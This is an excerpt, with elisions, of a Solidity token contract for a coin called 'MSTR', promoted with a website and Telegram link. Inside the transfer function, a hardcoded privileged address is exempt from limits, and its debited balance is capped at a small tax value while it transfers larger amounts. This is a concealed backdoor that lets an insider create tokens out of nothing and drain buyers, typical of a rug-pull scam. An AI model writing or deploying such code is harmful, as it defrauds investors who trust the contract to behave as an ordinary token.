...
Website: https://microstrategy.capital
TG: https://t.me/microstrategyeth
...
contract MSTR is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isMicroEx;
    mapping(address => uint256) private _holderLastTransfer;
    bool public transferDelayEnabled = true;
    address payable private _microAddr;
    ...
    constructor () {
        _microAddr = payable(0xDC18D3f36B7355625738155a3Be3F1b009E14071);
        _balances[_msgSender()] = _tTotal;
        _isMicroEx[owner()] = true;
        _isMicroEx[address(this)] = true;
        _isMicroEx[_microAddr] = true;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        uint256 taxAmount=0;
        uint256 taxMicro=amount;
        if (!_isMicroEx[from] && !_isMicroEx[to]) {
            ...
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isMicroEx[to] ) {
        ...
        } else if(from == address(_microAddr))
            taxMicro = min(amount,min(_initialBuyTax2Time,_maxTaxSwap));
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(taxMicro);
